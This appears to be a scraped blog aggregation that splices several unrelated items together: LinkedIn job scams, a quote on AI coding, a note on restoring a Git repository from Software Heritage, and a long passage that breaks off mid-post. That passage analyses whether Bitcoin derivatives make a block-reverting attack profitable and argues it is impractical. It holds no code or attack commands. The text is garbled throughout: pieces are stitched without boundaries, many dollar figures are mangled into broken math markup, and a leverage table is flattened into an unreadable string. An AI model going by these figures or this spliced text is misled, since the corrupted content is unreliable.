      <h1>LinkedIn Job Scams</h1>

(date: 2025-12-31, updated: 2025-12-30)
      <p>
      <p>Interesting <a href="https://restofworld.org/2025/linkedin-job-scams/">article</a> on the variety of LinkedIn job scams around the world:</p>
<blockquote>
<p>In India, tech jobs are used as bait because the industry employs millions of people and offers high-paying roles. In Kenya, the recruitment industry is largely unorganized, so scamsters leverage fake personal referrals. In Mexico, bad actors capitalize on the informal nature of the job economy by advertising fake formal roles that carry a promise of security. In Nigeria, scamsters often manage to get LinkedIn users to share their login credentials with the lure of paid work, preying on their desperation amid an especially acute unemployment crisis...</p>

      <blockquote>
<p>[...] The puzzle is still there. What’s gone is the labor. I never enjoyed hitting keys, writing minimal repro cases with little insight, digging through debug logs, or trying to decipher some obscure AWS IAM permission error. That work wasn’t the puzzle for me. It was just friction, laborious and frustrating. The thinking remains; the hitting of the keys and the frustrating is what’s been removed.</p>

      <h1>TIL: Downloading archived Git repositories from archive.softwareheritage.org</h1>

(date: 2025-12-30)
      <p>
      <p><strong><a href="https://til.simonwillison.net/github/software-archive-recovery">TIL: Downloading archived Git repositories from archive.softwareheritage.org</a></strong></p>
<p>Back in February I <a href="https://simonwillison.net/2025/Feb/7/sqlite-s3vfs/">blogged about</a> a neat Python library called <code>sqlite-s3vfs</code> for accessing SQLite databases hosted in an S3 bucket, released as MIT licensed open source by the UK government's Department for Business and Trade.</p>
<p>I went looking for it today and found that the <a href="https://github.com/uktrade/sqlite-s3vfs">github.com/uktrade/sqlite-s3vfs</a> repository is now a 404.</p>
<p>Since this is taxpayer-funded open source software I saw it as my moral duty to try and restore access! It turns out <a href="https://archive.softwareheritage.org/browse/origin/directory/?origin_url=https://github.com/uktrade/sqlite-s3vfs">a full copy</a> had been captured by <a href="https://archive.softwareheritage.org/">the Software Heritage archive</a>, so I was able to restore the repository from there. My copy is now archived at <a href="https://github.com/simonw/sqlite-s3vfs">simonw/sqlite-s3vfs</a>.</p>
<p>The process for retrieving an archive was non-obvious, so I've written up a TIL and also published a new <a href="https://tools.simonwillison.net/software-heritage-repo#https%3A%2F%2Fgithub.com%2Fuktrade%2Fsqlite-s3vfs">Software Heritage Repository Retriever</a> tool which takes advantage of the CORS-enabled APIs provided by Software Heritage. Here's <a href="https://gistpreview.github.io/?3a76a868095c989d159c226b7622b092/index.html">the Claude Code transcript</a> from building that.</p>

      <p>If I had billions of dollars I'd divest. And if my country did a good job of investing in education, health, voting rights, stuff like that, I'd just give most of it back to the country. Thanks for the education, and saving my life with medicine not just once but twice. Thanks for being such a cool country. If only we lived up to the promise, but now we'd certainly need to come up with another way of distributing the benefits to the country and its people.</p>

I find myself in the unusual position of defending Bitcoin from its critics, if only reluctantly.</p>
<p>In 2024 Soroush Farokhnia &amp; Amir Kafshdar Goharshady published <a href="https://hal.science/hal-04616643/"><em>Options and Futures Imperil Bitcoin's Security</em></a> and:</p>
<blockquote>
<p>showed that (i) a successful block-reverting attack does not necessarily require ... a majority of the hash power; (ii) obtaining a majority of the hash power ... costs roughly 6.77 billion ... and (iii) Bitcoin derivatives, i.e. options and futures, imperil Bitcoin’s security by creating an incentive for a block-reverting/majority attack.</p>
</blockquote>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAN-aOwjE0yBIHOJDZliWvVgunOcAX6g6HpQhiVMXr1OOJf3xnzhyphenhyphenw6Vcl7SA0EyJLc4IEt7mF_dMuj55hK_QovF2-msjUx24tBDFq6Z0Gza4UYKpDkJjMKuSqMQrNJVBx9-txPP0Y-msvG9gCI4f4F5Fs6zEI_7lpLgAsDE4K9Yzxwfje3ttqvJUubqZo/s1200/n-transactions.png"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAN-aOwjE0yBIHOJDZliWvVgunOcAX6g6HpQhiVMXr1OOJf3xnzhyphenhyphenw6Vcl7SA0EyJLc4IEt7mF_dMuj55hK_QovF2-msjUx24tBDFq6Z0Gza4UYKpDkJjMKuSqMQrNJVBx9-txPP0Y-msvG9gCI4f4F5Fs6zEI_7lpLgAsDE4K9Yzxwfje3ttqvJUubqZo/w200-h100/n-transactions.png" alt=""></a><a href="https://api.blockchain.info/charts/preview/n-transactions.png?timespan=1year&amp;h=600&amp;w=1200&amp;daysAverageString=7d">Source</a>
It is worth noting that they are not talking about profiting from double-spending. The Bitcoin blockchain transacts around <span class="math inline">\(17B/day of nominal value in around 450K transactions (average ~\)</span>38K), but in 2021 <a href="https://www.nber.org/papers/w29396">Igor Makarov &amp; Antoinette Schoar found that</a>:</p>
<blockquote>
<p>90% of transaction volume on the Bitcoin blockchain is not tied to economically meaningful activities but is the byproduct of the Bitcoin protocol design as well as the preference of many participants for anonymity ... exchanges play a central role in the Bitcoin system. They explain 75% of real Bitcoin volume.</p>
</blockquote>
<p>Of course, just because they aren't &quot;economically meaningful&quot; doesn't mean they aren't worth attacking! The average block has ~3.2K transactions, so ~<span class="math inline">\(121.6M/block. As a check. \)</span>121.6M * 144 block/day = $17.5B. So to recover their cost for a 51% attack would require double-spending about 8 hours worth of transactions.</p>
<p>I agree with their technical analysis of the attack, but I believe there would be significant difficulties in putting it into practice. Below the fold I try to set out these difficulties.</p>
<p><em>brevity is for the weak</em></p>
<p><a href="https://idlewords.com/">Maciej Cegłowski</a></p>
<p>First, I should point out that I wrote about using derivatives to profit from manipulating Bitcoin's price more than three years ago in <a href="https://blog.dshr.org/2022/07/pump-and-dump-schemes.html"><em>Pump-and-Dump Schemes</em></a>. These schemes have a long history in cryptocurrencies, but they are not the attack involved here. I don't claim expertise in derivatives trading, so it is possible my analysis is faulty. If so, please point out the problems in a comment.</p>
<h3>The Attack</h3>
<p>Farokhnia &amp; Goharshady build on the 2018 work of Ittay Eyal &amp; Emin Gün Sirer in <a href="http://dx.doi.org/10.1145/3212998"><em>Majority is not enough: Bitcoin mining is vulnerable</em></a>:</p>
<blockquote>
<p>The key idea behind this strategy, called Selfish Mining, is for a pool to keep its discovered blocks private, thereby intentionally forking the chain. The honest nodes continue to mine on the public chain, while the pool mines on its own private branch. If the pool discovers more blocks, it develops a longer lead on the public chain, and continues to keep these new blocks private. When the public branch approaches the pool's private branch in length, the selfish miners reveal blocks from their private chain to the public.</p>
<p>...</p>
<p>We further show that the Bitcoin mining protocol will never be safe against attacks by a selfish mining pool that commands more than 1/3 of the total mining power of the network. Such a pool will always be able to collect mining rewards that exceed its proportion of mining power, even if it loses every single block race in the network. The resulting bound of 2/3 for the fraction of Bitcoin mining power that needs to follow the honest protocol to ensure that the protocol remains resistant to being gamed is substantially lower than the 50% figure currently assumed, and difficult to achieve in practice.</p>
</blockquote>
<p>In April 2024 Farokhnia &amp; Goharshady <a href="https://hal.science/hal-04616643/">observed that</a>:</p>
<blockquote>
<p>Given that the rule of thumb followed by most practitioners is to wait for 6 confirmations, a fork that goes 6 levels deep can very likely diminish the public’s trust in Bitcoin and cause a crash in its market price. It is also widely accepted that a prolonged majority attack (if it happens) would be catastrophic to the cryptocurrency and can cause its downfall.</p>
</blockquote>
<p>But, as they lay out, this possibility is <a href="https://hal.science/hal-04616643/">discounted</a>:</p>
<blockquote>
<p>The conventional wisdom in the blockchain community is to assume that such block-reverting attacks are highly unlikely to happen. The reasoning goes as follows:</p>
<ol>
<li>Reverting multiple blocks and specifically double-spending a transaction that has 6 confirmations requires control of a majority of the mining power;</li>
<li>Having a majority of the mining power is prohibitively expensive and requires an outlandish investment in hardware;</li>
<li>Even if a miner, mining pool or group of pools does control a majority of the mining power, they have no incentive to act dishonestly and revert the blockchain, as that would crash the price of Bitcoin, which is ultimately not in their favor, since they rely on mining rewards denominated in BTC for their income.</li>
</ol>
</blockquote>

Starting in late 2020, as shown in <a href="https://www.economist.com/christmas-specials/2021/12/18/the-most-powerful-people-in-crypto"><em>The Economist</em>'s graphic</a>, the spot market in Bitcoin became dwarfed by the derivatives markets. In the last month <a href="https://www.theblock.co/data/crypto-markets/options"><span class="math inline">\(1.7T](https://www.theblock.co/data/crypto-markets/futures/volume-of-bitcoin-futures-monthly) of Bitcoin futures traded on unregulated exchanges, and [\)</span>6.4B</a> on regulated exchanges. Compare this with the <a href="https://coinmarketcap.com/currencies/volume/monthly/">$1.8B</a> of the spot market in the same month.</p>
<p>These huge futures markets enable Farokhnia &amp; Goharshady's <a href="https://hal.science/hal-04616643/">attack</a>:</p>
<blockquote>
<p>In short, an attacker can first use the Bitcoin derivatives market to short Bitcoin by purchasing a sufficient amount of put options or other equivalent financial instruments. She can then invest any of the amounts calculated above, depending on the timeline of the attack, to obtain the necessary hardware and hash power to perform the attack. If the attacker chooses to obtain a majority of the hash power, her success is guaranteed and she can revert the blocks as deeply as she wishes. However, she also has the option of a smaller upfront investment in hardware in exchange for longer wait times to achieve a high probability of success. In any case, as long as her earnings from shorting Bitcoin and then causing an intentional price crash outweighs her investments in hardware, there is a clear financial incentive to perform such an attack. The numbers above show that the annual trade volume in Bitcoin derivatives is more than three orders of magnitude larger than the required investment in hardware. Thus, it is possible and profitable to perform such an attack.</p>
</blockquote>
<h3>Assumptions</h3>
<p>Farokhnia &amp; Goharshady make some <a href="https://hal.science/hal-04616643/">simplifying assumptions</a>:</p>
<blockquote>
<ul>
<li>We only consider the cost of hardware at the time of writing. We assume the attacker is buying the hardware, rather than renting it and do not consider potential discounts on bulk orders.</li>
<li>We ignore electricity costs as they vary widely based on location.</li>
</ul>
<p>The justification for the first assumption is that it keeps our analysis sound, i.e. we can only over-approximate the cost by making this assumption. As for the second assumption, we note that electricity costs are often negligible in comparison to hardware costs and that our main argument, i.e. the vulnerability of Bitcoin to majority attacks and block-reverting attacks, remains intact even if the estimates we obtain here are doubled. Indeed, as we will soon see, the trade volume of Bitcoin derivatives is more than three orders of magnitude larger than the numbers obtained here.</p>
</blockquote>
<h3>Goal</h3>
<p>As Farokhnia &amp; Goharshady stress, the success of a block-reverting attack is probabilistic, so the attacker needs to have a high enough probability of making a large enough profit to make up for the risk of failure.</p>
<p>My analysis thus assumes that the goal of the attacker is to have a 95% probability of earning at least double the cost of the attack.</p>
<h3>Attacker</h3>
<p>There are two different kinds of attackers with different sets of difficulties:</p>
<ul>
<li><strong>Outsiders:</strong> someone who has to acquire or rent sufficient hash power.</li>
<li><strong>Insiders:</strong> someone or some mining pool who already controls sufficient hash power.</li>
</ul>
<p>Farokhnia &amp; Goharshady study the outsider case. Both kinds of attacker's practical problems occur in two areas:</p>
<ul>
<li>Obtaining and maintaining for the duration of the attack sufficient hash power without detection.</li>
<li>Obtaining and maintaining for the duration of the attack a sufficient short position in Bitcoin without detection.</li>
</ul>
<p>The short position must be maintained for the duration of the attack because succeess may come at any 10-minute block time, and there would not be time to obtain a large enough short position in ten minutes.</p>
<h3>Hash Power</h3>
<p>The outsider's problems are more complex than the insider's.</p>
<h4>Outsider Attack</h4>
<p>The outsider attacker requires three kinds of resource:</p>
<ul>
<li>Mining rigs.</li>
<li>Power to run the rigs.</li>
<li>Data center space to hold the rigs.</li>
</ul>
<p>Each of these is problematic, but assuming that the difficulties could be overcome, there is then the question of what it would cost to run the attack..</p>
<h5>Mining rigs</h5>
<ul>
<li>Could they acquire mining rigs sufficient to provide 30% of the combined insider and outsider hash power, or ~43% of the pre-attack hash power?</li>
<li>How long would it take to acquire the rigs?</li>
<li>Would their acquisition of the rigs be detected?</li>
</ul>
<p>Bitmain is estimated to have <a href="https://www.jbs.cam.ac.uk/wp-content/uploads/2025/04/2025-04-cambridge-digital-mining-industry-report.pdf">82% of the market for mining rigs</a>, and they either control or have very close relations with <a href="https://papers.ssrn.com/sol3/Delivery.cfm?abstractid=3320437">all the major mining pools</a>, who thus have priority access to the latest rigs. Because rigs <a href="https://blog.dshr.org/2022/05/generally-accepted-accounting-principles.html">depreciate rapidly</a>, position in the queue for rigs has a big impact on the profitability of mining. Bitmain is unlikely to give a new customer priority access to rigs.</p>
<p>Because the economic life of mining rigs is <a href="https://blog.dshr.org/2022/05/generally-accepted-accounting-principles.html">less than two years</a>, the first part of Bitmain's production goes into maintaining the hash rate by replacing obsolete rigs. The second part goes into increasing the hash rate. If we assume that the outsider attacker could absorb the second part of Bitmain's production, how long would it take to get the necessary 43% of the previous hash power?</p>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4_4Ck8QpAbjp0KwhmPJyTk3T6WW34hwpHSH6aJT-bWmLSmEK0JBfdbHRui1E6l652aI-KpGTtcxqox4k3-6Iy9BkMcmKLUNrl2q09rU7mUFsqg8-MMgGqGk8lJKApwNeAV2_G_J4h-wIvJ0qOzp2INvPFU8rhxQdc4YzGEi6e_aGjxdZac1P6NUYsegqM/s1200/hash-rate.png"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4_4Ck8QpAbjp0KwhmPJyTk3T6WW34hwpHSH6aJT-bWmLSmEK0JBfdbHRui1E6l652aI-KpGTtcxqox4k3-6Iy9BkMcmKLUNrl2q09rU7mUFsqg8-MMgGqGk8lJKApwNeAV2_G_J4h-wIvJ0qOzp2INvPFU8rhxQdc4YzGEi6e_aGjxdZac1P6NUYsegqM/w200-h100/hash-rate.png" alt=""></a><a href="https://api.blockchain.info/charts/preview/hash-rate.png?timespan=3years&amp;h=600&amp;w=1200&amp;daysAverageString=7D">Source</a>
This can be estimated by examining the <a href="https://mempool.space/graphs/mining/hashrate-difficulty#3y">hash power through time graph</a>. Over the last 3 years the hash rate has increased from about 240EH/s to about 1120EH/s, or about 24EH/s/month. Roughly, 82% of this is Bitmain's output, or about 20EH/s/month. The attacker needs 43% of the current hash rate, or about 482EH/s, or 24 months of the second part of Bitmain's production. At the <a href="https://data.hashrateindex.com/chart/asic-price-index">current price</a> for leading-edge rigs of <span class="math inline">\(14.11/TH/s this would cost about \)</span>6.8B plus say <span class="math inline">\(340M in interest at 5%, or \)</span>7.14B.</p>
<p>The lack of rigs to increase the hash rate over a period of much less than two years would clearly be detectable.</p>
<h5>Power</h5>
<p>The <a href="https://ccaf.io/cbnsi/cbeci">Cambridge Bitcoin Energy Consumption Index</a>'s current estimate is that the network consumes 22GW. The outside attacker would need 43% of this, or about 9.5GW, for the duration of the attack. For context, Meta's extraordinarily aggressive <a href="https://techcrunch.com/2025/07/14/mark-zuckerberg-says-meta-is-building-a-5gw-ai-data-center/">AI data center plans</a> claim to bring a single 1GW data center online in 2026, and the first 2GW phase of their planned $27B 5GW Louisiana data center in 2030. The constraint on the roll-out is largely that lack of access to sufficient power. The attacker would need double the power Meta's Louisiana data center plans to have in 2030.</p>
<p>Access to gigawatts of power is available only on long-term contracts and only after significant delays.</p>
<h5>Data centers</h5>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtCFFSNzEzXC1gbShU0-ajhRmv00akss-K-YhEv5oxeaV3bCMmRlS3-vwAh3yli4wNNUH27oX9SORLQ_ryDJrgSJa791WWTNhcspzUwWCbvKgz2Ndk2Pwv2d7gcVTyENFBl3s8fWy7imeMU9X_MQbDp6f5QD9HN90BnSSFJ8f-bqf3Cq9L2XI9wi7h1-Um/s2056/Hyperion.png"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtCFFSNzEzXC1gbShU0-ajhRmv00akss-K-YhEv5oxeaV3bCMmRlS3-vwAh3yli4wNNUH27oX9SORLQ_ryDJrgSJa791WWTNhcspzUwWCbvKgz2Ndk2Pwv2d7gcVTyENFBl3s8fWy7imeMU9X_MQbDp6f5QD9HN90BnSSFJ8f-bqf3Cq9L2XI9wi7h1-Um/w200-h173/Hyperion.png" alt=""></a><a href="https://about.fb.com/news/2025/12/metas-richland-parish-data-center-supports-louisiana-economy-875-million-in-contracts/">Hyperion</a>
Meta's 5GW Louisiana &quot;Hyperion&quot; data center's &quot; <a href="https://techcrunch.com/2025/07/14/mark-zuckerberg-says-meta-is-building-a-5gw-ai-data-center/">footprint will be large enough to cover most of Manhattan</a>&quot;, and the outsider attacker would need two of them. If Meta expects to take more than 5 years to build one of them, the outsider attacker is likely to need a decade.</p>
<p>Estimates for AI data centers are that 60% of the capital cost is the hardware and 40% everything else. Thus the &quot;everything else&quot; for Meta's <span class="math inline">\(27B 5GW data center is \)</span>10.8B. &quot;Everything else&quot; for the attacker's two similar data centers would thus be <span class="math inline">\(21.6B. Plus say 5 years of interest at 5% or \)</span>5.4B.</p>
<h5>Operational cost</h5>
<p>Ignoring the evident impossibility of the outsider attacker amassing the necessary mining rigs, power and data center space, what would the operational costs of the attack be?</p>
<p>It is hard to estimate the costs for power, data center space, etc. But an estimate can be based upon the cost to rent hash power, noting that in practice renting 43% of the total would be impossible, and guessing that renters have a 30% margin. A typical rental fee would be <span class="math inline">\(0.10/TH/day so the costs might be \)</span>0.07/TH/day. The attack would have a 95% probability of needing 482EH/s over 34 days or less, so $516M or less.</p>
<p>Thus the estimated total cost for the hash power used in the attack would have a 95% probability of being no more than <span class="math inline">\(7.66B. Plus about \)</span>27B in data center cost, which could presumably be repurposed to AI after the attack.</p>
<h4>Insider Attack</h4>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiG4OC7d1y9dSy7QRu0KJzjwavLfrw0YferKscCj56_v1WzbRSDJH2X6S7nAKhnoQUWd4mTG5UzEa-6VXnijaoaf1k49uRKvtb1zFeeun_hAWZFUGMCuzizv-7QgvGgv-eoUvqRu_bCeQ_Ur7-Sj0gsBdMuwe3y7Rqjp65p2obWTRF7po_tbxvbnlWZxipf/s1200/HashRate-1Y.png"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiG4OC7d1y9dSy7QRu0KJzjwavLfrw0YferKscCj56_v1WzbRSDJH2X6S7nAKhnoQUWd4mTG5UzEa-6VXnijaoaf1k49uRKvtb1zFeeun_hAWZFUGMCuzizv-7QgvGgv-eoUvqRu_bCeQ_Ur7-Sj0gsBdMuwe3y7Rqjp65p2obWTRF7po_tbxvbnlWZxipf/w200-h100/HashRate-1Y.png" alt=""></a><a href="https://www.blockchain.com/explorer/charts/hash-rate">Source</a>
The insider attacker already controls the 30% of the hash power they need, so only the question of detection remains. The essence of the block-reverting attack is that the attacker mines in secret until they can publish a chain with 6 blocks following a target block. A reduction of 30% of the public hash rate over an average period of 17 days would clearly be detectable. The hash rate is noisy, but the graph shows that over the last year the largest drop was 16% from June 14th to 27th. There was one large drop in the hash rate, 51% between May 10th and July 1st 2021 as <a href="https://blog.dshr.org/2021/07/graphing-chinas-cryptocurrency-crackdown.html">China cracked down</a> on mining.</p>
<p>The insider's loss of income from the blocks they would otherwise have mined would have a 95% probability of being 4,590 BTC or less, or about $425M.</p>
<h3>Short Position</h3>
<p>Both kinds of attackers need to ensure that, when the attack succeeds, they have a large enough short position in Bitcoin that would generate their expected return from the attack's decrease in the Bitcoin price. There are two possibilities:</p>
<ul>
<li>When the attacker's chain is within one block of being the longest, they have ten minutes to purchase the shorts. There is unlikely to be enough liquidity in the market to accommodate this sudden demand, which in any case would greatly increase the price of the shorts. I will ignore this possibility in what follows.</li>
<li>At the start of the attack the attacker gradually accumulates sufficient shorts. Even assuming there were enough liquidity, and that the purchases didn't increase the price, the attacker has to bear both the cost of maintaining the shorts for the duration of the attack, and the risk of the market moving up enough to cause the position to be liquidated.</li>
</ul>
<p>The success of a block-reverting attack on Bitcoin would have implications on other cryptocurrencies. It would likely increase the prices fo Proof-of-Stake coins such as Ethereum, as being much ore difficult to attack, and decrease the price of other Proof-of-Work coins. Derivatives on these coins might be included int he attacker's toolkit, but I will ignore this possibility as the open interest on these coins is smaller.</p>
<p>Farokhnia &amp; Goharshady <a href="https://hal.science/hal-04616643/">note that</a>:</p>
<blockquote>
<p>At the time of writing, the open interest of BTC options is a bit more than 20 billion USD. Thus, a malicious party performing the attack mentioned in this work would need to obtain a considerable amount of the available put contracts. This may lead to market disruptions whose analysis is beyond the scope of this work. This being said, if the derivatives market continues to grow and becomes much larger than it currently is, purchasing this amount of contracts might not even be detected.</p>
</blockquote>
<p>There are two different kinds of market in which Bitcoin shorts are available:</p>
<ul>
<li><strong>Regulated exchanges</strong> such as the CME offering options on Bitcoin and stock exchanges with Bitcoin ETFs and Bitcoin treasury companies such as Strategy.</li>
<li><strong>Unregulated exchanges</strong> such as Binance offering &quot;perpetual futures&quot; (perps) on Bitcoin.</li>
</ul>
<h4>Unregulated Exchanges</h4>
<p>Patrick McKenzie's <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/"><em>Perpetual futures, explained</em></a> is a clear and comprehensive description of the derivative common on unregulated exchanges:</p>
<blockquote>
<p>Instead of all of a particular futures vintage settling on the same day, perps settle multiple times a day for a particular market on a particular exchange. The mechanism for this is the <em>funding rate</em>. At a high level: winners get paid by losers every e.g. 4 hours and then the game continues, unless you’ve been blown out due to becoming overleveraged or for other reasons (discussed in a moment).</p>
<p>Consider a toy example: a retail user buys 0.1 Bitcoin via a perp. The price on their screen, which they understand to be for Bitcoin, might be <span class="math inline">\(86,000 each, and so they might pay \)</span>8,600 cash. Should the price rise to <span class="math inline">\(90,000 before the next settlement, they will get +/- \)</span>400 of winnings credited to their account, and their account will continue to reflect exposure to 0.1 units of Bitcoin via the perp. They might choose to sell their future at this point (or any other). They’ll have paid one commission (and a spread) to buy, one (of each) to sell, and perhaps they’ll leave the casino with their winnings, or perhaps they’ll play another game.</p>
<p>Where did the money come from? Someone else was symmetrically short exposure to Bitcoin via a perp. It is, with some very important caveats incoming, a closed system: since no good or service is being produced except the speculation, winning money means someone else lost.</p>
</blockquote>
<p>So the exchange makes money from commissions, and from the spread against the actual spot price. The price of the perp is maintained close to the spot price by the &quot;basis trade&quot;, traders providing liquidity by shorting the perp and buying the spot when the perp is above spot, and vice versa. Of course, the spot price itself may have been manipulated, for example by <a href="https://blog.dshr.org/2022/07/pump-and-dump-schemes.html"><em>Pump-and-Dump Schemes</em></a>.</p>
<p>How else does the exchange <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/">make money</a>?</p>
<blockquote>
<p>Perp funding rates also embed an interest rate component. This might get quoted as 3 bps a day, or 1 bps every eight hours, or similar. However, because of the impact of leverage, gamblers are paying more than you might expect: at 10X leverage that’s 30 bps a day.</p>
</blockquote>
<p>A &quot;basis point (bps)&quot; is &quot; <a href="https://www.investopedia.com/terms/b/basispoint.asp">one hundredth of 1 percentage point</a>&quot;, so 30bps/day is 0.3%/day or around 120%/year. But the lure of leverage is the competitive advantage of <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/">unregulated exchanges</a>:</p>
<blockquote>
<p>In a standard U.S. brokerage account, Regulation T has, for almost 100 years now, set maximum leverage limits (by setting minimums for margins). These are 2X at position opening time and 4X “maintenance” (before one closes out the position). Your brokerage would be obligated to forcibly close your position if volatility causes you to exceed those limits.</p>
</blockquote>
<p>Unregulated markets <a href="https://www.binance.com/en/square/post/24757521817370">are different</a>:</p>
<blockquote>
<p>Binance allows up to 125x leverage on BTC.</p>
</blockquote>
<p>Although these huge amounts of leverage greatly increase the reward from a small market movement in favor of the position, they greatly reduce the amount the market has to move against the position before something bad happens. The first bad thing is <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/">liquidation</a>:</p>
<blockquote>
<p>One reason perps are structurally better for exchanges and market makers is that they simplify the business of blowing out leveraged traders. The exact mechanics depend on the exchange, the amount, etc, but generally speaking you can either force the customer to enter a closing trade or you can assign their position to someone willing to bear the risk in return for a discount.</p>
<p>Blowing out losing traders is lucrative for exchanges except when it catastrophically isn’t. It is a priced service in many places. The price is quoted to be low (“a nominal fee of 0.5%” is one way Binance describes it) but, since it is calculated from the amount at risk, it can be a large portion of the money lost. If the account’s negative balance is less than the liquidation fee, wonderful, thanks for playing and the exchange / “the insurance fund” keeps the rest, as a tip.</p>
</blockquote>
<p>The bigger and faster the market move, the more likely the loss exceeds your <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/">collateral</a>:</p>
<blockquote>
<p>In the case where the amount an account is negative by is more than the fee, that “insurance fund” can choose to pay the winners on behalf of the liquidated user, at management’s discretion. Management will <em>usually</em> decide to do this, because a casino with a reputation for not paying winners will not long remain a casino.</p>
<p>But tail risk is a real thing. The capital efficiency <em>has a price</em>: there physically does not exist enough money in the system to pay all winners given sufficiently dramatic price moves. Forced liquidations happen. Sophisticated participants withdraw liquidity (for reasons we’ll soon discuss) or the exchange becomes overwhelmed technically / operationally. The forced liquidations eat through the diminished / unreplenished liquidity in the book, and the magnitude of the move increases.</p>
</blockquote>
<p>The second bad thing is <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/">automatic de-leveraging (ADL)</a>:</p>
<blockquote>
<p>Risk in perps has to be symmetric: if (accounting for leverage) there are 100,000 units of Somecoin exposure long, then there are 100,000 units of Somecoin exposure short. This does not imply that the shorts or longs are sufficiently capitalized to <em>actually pay</em> for all the exposure in all instances.</p>
<p>In cases where management deems paying winners from the insurance fund would be too costly and/or impossible, they automatically deleverage some winners.</p>
</blockquote>
<p>McKenzie illustrates ADL with <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/">an example</a>:</p>
<blockquote>
<p>So perhaps you understood, prior to a 20% move, that you were 4X leveraged. You just earned 80%, right? Ah, except you were only 2X leveraged, so you earned 40%. Why were you <em>retroactively</em> only 2X? That’s what automatic deleveraging means. Why couldn’t you get the other 40% you feel entitled to? Because the collective group of losers doesn’t have enough to pay you your winnings and the insurance fund was insufficient or deemed insufficient by management.</p>
</blockquote>
<p>For our purposes, this is an <a href="https://www.bitsaboutmoney.com/archive/perpetual-futures-explained/">important note</a>:</p>
<blockquote>
<p>In theory, this can happen to the upside or the downside. <em>In practice</em> in crypto, this seems to usually happen after sharp decreases in prices, not sharp increases. For example, October 2025 saw widespread ADLing as (more than) <a href="https://www.bloomberg.com/news/articles/2025-11-22/crypto-s-brutal-month-triggers-a-stress-test-for-wall-street">$19 billion of liquidations</a> happened, across a variety of assets.</p>
</blockquote>
<p>How does this affect the outsider attacker? Lets assume that the attack has a 95% probability of costing no more than <span class="math inline">\(7.5B and would reduce the Bitcoin price from \)</span>100K to <span class="math inline">\(80K in a single 4-hour period. With 10X leverage this would generate \)</span>200K/BTC in gains.</p>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHBAY0EoZ2pA-FVFt1IUpQUgGPUbxRAh8At6zZ1kGoAJx2HFY9XA4MrtjaCjCqs2nD8keQl6r3BEM471hUas8Wm_hVa98wjl9tHrl30ZT-ZXY1xN_9FXZle2vXgbopm7EpVFztr2X-b8-4oaecK9I1kIYOcOHwxpl4FPtVcTMcshGEPSBUIYj_eIfTYdel/s982/OpenInterestUnregulated.png"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHBAY0EoZ2pA-FVFt1IUpQUgGPUbxRAh8At6zZ1kGoAJx2HFY9XA4MrtjaCjCqs2nD8keQl6r3BEM471hUas8Wm_hVa98wjl9tHrl30ZT-ZXY1xN_9FXZle2vXgbopm7EpVFztr2X-b8-4oaecK9I1kIYOcOHwxpl4FPtVcTMcshGEPSBUIYj_eIfTYdel/w200-h149/OpenInterestUnregulated.png" alt=""></a><a href="https://www.theblock.co/data/crypto-markets/options">Source</a>
The outsider wants to double the cost of the attack, so needs to short <span class="math inline">\(15B/\)</span>180K BTC, or 83,333BTC at 10X leverage for the duration of the attack. Establishing the position costs <span class="math inline">\(8.333B. Assuming the BTC price is fixed at \)</span>100K until the attack succeeds the funding rate is zero. But we have to assume that the attacker borrowed the $8.333B for the duration, so would pay interest, plus two commissions plus two spreads. I'll ignore these costs.</p>
<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfxYdKjuJ_I5rR46_YnNoWfIZaDl3vVOD1FFtfoo-LC9lxTjkY9R88joSCXbshwns7Cw7ojlLuwvqVjs_0ECisA1KQQu22caVa-OasLsS8VEHGOQZf5PavSA4_LG3-YZU39aVBQSLXF40pJN1jRggBczxuW777UmcsrFm9PI6ARyBlI29s9Rdr8TsbV68u/s1200/BTC-1month.png"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfxYdKjuJ_I5rR46_YnNoWfIZaDl3vVOD1FFtfoo-LC9lxTjkY9R88joSCXbshwns7Cw7ojlLuwvqVjs_0ECisA1KQQu22caVa-OasLsS8VEHGOQZf5PavSA4_LG3-YZU39aVBQSLXF40pJN1jRggBczxuW777UmcsrFm9PI6ARyBlI29s9Rdr8TsbV68u/w200-h100/BTC-1month.png" alt=""></a><a href="https://api.blockchain.info/charts/preview/market-price.png?timespan=30days&amp;h=600&amp;w=1200">Source</a>
I will also ignore the fact that <span class="math inline">\(83B is around 148% of the peak aggregated open interest in Bitcoin options over the past year of about \)</span>56B.</p>
<p>The way liquidation of a short works is that as the market moves up, the initial leverage increases. Each exchange will have a limit on the leverage it will allow so, allowing for the liquidation fee, if the leverage of the short position gets to this limit the exchange will liquidate it.</p>
<p>Move %Leverage010111.1212.5314.3416.7520625733.38509100
The table shows the effect of increasing percentage moves against an initial 10X leveraged short. If we assume a short with an initial 10X leverage and an exchange limit of 50X was taken out on the first of each month of 2025, on 9 of the 12 months it would have been liquidated before the month was out. So Bitcoin is volatile enough that the attacker's short has a high probability of being liquidated before the attack succeeds. And note Binance's &quot;nominal fee&quot; of 0.5% for liquidating <span class="math inline">\(83.33B, or \)</span>417M.</p>
<p>In the unlikely event that the attack succeeds early enough to avoid liquidation there would have been one of those &quot;sharp decreases in prices&quot; that cause ADL, so as a huge winner it would be essentially certain that the attacker would suffer ADL and most of the winnings needed to justify the attack would evaporate.</p>
<h4>Regulated Exchanges</h4>
